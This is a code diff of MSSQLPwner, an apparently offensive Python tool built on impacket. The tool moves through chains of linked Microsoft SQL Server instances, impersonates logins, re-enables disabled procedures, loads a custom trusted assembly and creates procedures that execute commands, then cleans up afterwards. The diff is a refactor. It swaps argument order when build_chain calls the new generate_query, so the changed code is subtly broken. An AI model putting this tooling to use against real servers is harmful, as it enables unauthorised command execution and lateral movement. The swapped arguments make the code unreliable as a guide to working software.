@@ -18,13 +18,10 @@ from typing import Callable
 from impacket import version
 from playbooks import modules
 from playbooks import Queries
-from typing import Literal, Union, Any
+from typing import Literal, Any
 from impacket.examples import logger
 from base_sql_client import BaseSQLClient
 from impacket.examples.utils import parse_target
-
-
-# TODO: IS_UPDATE_SP_CONFIGURE_ALLOWED
 
 
 class MSSQLPwner(BaseSQLClient):
@@ -384,8 +381,8 @@ class MSSQLPwner(BaseSQLClient):
             chained_query = method_func(link, chained_query)
         return chained_query
 
-    def build_linked_query_chain(self, linked_server: str, query: str,
-                                 method: Literal["exec_at", "OpenQuery", "blind_OpenQuery"]) -> Union[str, None]:
+    def generate_query(self, query: str, linked_server: str,
+                       method: Literal['OpenQuery', 'blind_OpenQuery', 'exec_at'] = "OpenQuery"):
         """
         This function is responsible to split a linked server path string in order to build chained queries through the
          linked servers using the OpenQuery or exec function.
@@ -394,8 +391,11 @@ class MSSQLPwner(BaseSQLClient):
             OpenQuery(Server1, 'OpenQuery(Server2, ''OpenQuery(Server3, '''query''')'')')
             EXEC ('EXEC (''EXEC ('''query''') AT Server3'') AT Server2') AT Server1
         """
-        if not linked_server:
+        query = f"{self.execute_as}{query}"
+        if linked_server == self.state['local_hostname']:
             return query
+        if method == "blind_OpenQuery":
+            query = f"SELECT 1; {query}"
         if linked_server not in self.state['servers_info'].keys():
             LOG.error(f"Server {linked_server} is not linkable from {self.state['local_hostname']}")
             return None
@@ -407,15 +407,7 @@ class MSSQLPwner(BaseSQLClient):
         """
          This function is responsible to build the query chain for the given query and method.
         """
-        query = f"{self.execute_as}{query}"
-        if linked_server != self.state['local_hostname']:
-            if method == "blind_OpenQuery":
-                query = f"SELECT 1; {query}"
-            query = self.build_linked_query_chain(linked_server, query, method)
-            if not query:
-                LOG.error("Failed to build query chain")
-                return {'is_success': False, 'results': None}
-
+        query = self.generate_query(linked_server, query, method)
         return self.custom_sql_query(query, print_results=print_results, decode_results=decode_results, wait=wait)
 
     def can_impersonate(self, linked_server: str) -> bool:
@@ -487,8 +479,8 @@ class MSSQLPwner(BaseSQLClient):
             rev2self_status = 0 if required_status else 1
             query += Queries.RECONFIGURE_PROCEDURE.format(procedure=procedure_custom_name, status=status)
             LOG.info(f"Reconfiguring {procedure}")
-            self.add_rev2self_cmd(linked_server,
-                                  Queries.RECONFIGURE_PROCEDURE.format(procedure=procedure, status=rev2self_status))
+            self.add_rev2self_query(linked_server,
+                                    Queries.RECONFIGURE_PROCEDURE.format(procedure=procedure, status=rev2self_status))
 
             if not self.build_chain(query, linked_server, method="exec_at")['is_success']:
                 LOG.warning(f"Failed to enable {procedure}")
@@ -567,7 +559,7 @@ class MSSQLPwner(BaseSQLClient):
                 return False
 
             LOG.info(f"Trusting our custom assembly")
-            self.add_rev2self_cmd(linked_server, Queries.UNTRUST_MY_APP.format(my_hash=my_hash))
+            self.add_rev2self_query(linked_server, Queries.UNTRUST_MY_APP.format(my_hash=my_hash))
         add_custom_asm = self.build_chain(Queries.ADD_CUSTOM_ASM.format(custom_asm=custom_asm_hex, asm_name=asm_name),
                                           linked_server, method="exec_at")
         if (not add_custom_asm['is_success']) and 'already exists in database' not in add_custom_asm['replay']:
@@ -592,8 +584,8 @@ class MSSQLPwner(BaseSQLClient):
         if (not add_procedure['is_success']) and 'is already an object named' not in add_procedure['replay']:
             LOG.error(f"Failed to create procedure")
             return False
-        self.add_rev2self_cmd(linked_server, Queries.DROP_PROCEDURE.format(procedure_name=procedure_name))
-        self.add_rev2self_cmd(linked_server, Queries.DROP_ASSEMBLY.format(asm_name=asm_name))
+        self.add_rev2self_query(linked_server, Queries.DROP_PROCEDURE.format(procedure_name=procedure_name))
+        self.add_rev2self_query(linked_server, Queries.DROP_ASSEMBLY.format(asm_name=asm_name))
 
         procedure_query = Queries.PROCEDURE_EXECUTION.format(procedure=procedure_name, command=command)
         results = self.build_chain(procedure_query, linked_server, method="exec_at")
@@ -619,8 +611,8 @@ class MSSQLPwner(BaseSQLClient):
             class_name=class_name, arg="@port int"),
             linked_server, method="exec_at")
 
-        self.add_rev2self_cmd(linked_server, Queries.DROP_FUNCTION.format(function_name=function_name))
-        self.add_rev2self_cmd(linked_server, Queries.DROP_ASSEMBLY.format(asm_name='FuncAsm'))
+        self.add_rev2self_query(linked_server, Queries.DROP_FUNCTION.format(function_name=function_name))
+        self.add_rev2self_query(linked_server, Queries.DROP_ASSEMBLY.format(asm_name='FuncAsm'))
         if (not add_function['is_success']) and 'already exists in database' not in add_function['replay']:
             LOG.error(f"Failed to create procedure")
             return False
@@ -666,13 +658,13 @@ class MSSQLPwner(BaseSQLClient):
                 return True
         return False
 
-    def add_rev2self_cmd(self, linked_server: str, cmd: str) -> None:
+    def add_rev2self_query(self, linked_server: str, query: str) -> None:
         """
         This function is responsible to add a command to the rev2self queue.
         """
         if linked_server not in self.rev2self.keys():
             self.rev2self[linked_server] = []
-        self.rev2self[linked_server].append(f"{self.execute_as}{cmd}")
+        self.rev2self[linked_server].append(self.generate_query(query, linked_server, method="exec_at"))
 
     def rev2self_cmd(self) -> None:
         """
